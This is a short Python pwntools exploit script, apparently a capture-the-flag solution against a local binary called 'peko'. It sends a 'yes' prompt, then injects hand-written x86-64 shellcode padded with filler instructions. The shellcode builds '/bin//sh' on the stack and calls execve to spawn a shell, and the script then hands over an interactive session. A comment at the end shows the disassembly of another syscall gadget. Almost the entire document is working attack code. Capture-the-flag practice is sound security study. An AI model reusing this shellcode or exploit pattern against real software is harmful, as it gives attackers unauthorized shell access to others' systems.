from pwn import *
import struct
context.arch = "amd64"
p = process('peko_distribute/share/peko')

pause()
payload = flat(
    b"yes",
)
p.send(payload)
payload2 = flat(
     b"\x50\x48\x31\xd2\xB1\x87\x48\x31\xf6\x80\xE9\x87\x80\xC1\x87\xB1\x87\x48\xC7\xC3\x2F\x2F\x73\x68\xB1\x87\xB1\x87\x48\xC1\xE3\x20\x80\xC1\x87\xB1\x87\xB1\x87\x48\x81\xC3\x2F\x62\x69\x6E\xB1\x87\xB1\x87\x53\x54\x5f\xb0\x3b\x0f\x05\xB1\x87\xB1\x87\x80\xC1\x87"
)
p.send(payload2)
pause()
p.interactive()

'''
0:  48 8d 35 13 00 00 00    lea    rsi,[rip+0x13]        # 0x1a
7:  48 83 c4 28             add    rsp,0x28
b:  48 8d 9d 46 ff ff ff    lea    rbx,[rbp-0xba]
12: 38 c2                   cmp    dl,al
14: 48 0f 44 de             cmove  rbx,rsi
18: 53                      push   rbx
19: c3                      ret
1a: b0 e7                   mov    al,0xe7
1c: 0f 05                   syscall
'''